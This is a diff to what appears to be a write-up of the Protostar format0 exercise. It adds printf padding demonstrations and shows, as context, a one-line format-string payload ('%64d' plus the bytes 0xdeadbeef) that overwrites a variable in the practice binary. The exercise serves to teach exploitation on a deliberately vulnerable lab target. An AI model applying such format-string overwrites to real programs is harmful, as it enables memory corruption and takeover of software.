@@ -50,6 +50,24 @@ user@protostar:/opt/protostar/bin$
 ```
 
 ```sh
+user@protostar:/opt/protostar/bin$ printf "%10d\n"
+         0
+user@protostar:/opt/protostar/bin$
+```
+
+```sh
+user@protostar:/opt/protostar/bin$ printf "%20d\n"
+                   0
+user@protostar:/opt/protostar/bin$
+```
+
+```sh
+user@protostar:/opt/protostar/bin$ printf "%30d\n"
+                             0
+user@protostar:/opt/protostar/bin$
+```
+
+```sh
 user@protostar:/opt/protostar/bin$ ./format0 `python -c "print '%64d\xef\xbe\xad\xde'"`
 you have hit the target correctly :)
 user@protostar:/opt/protostar/bin$
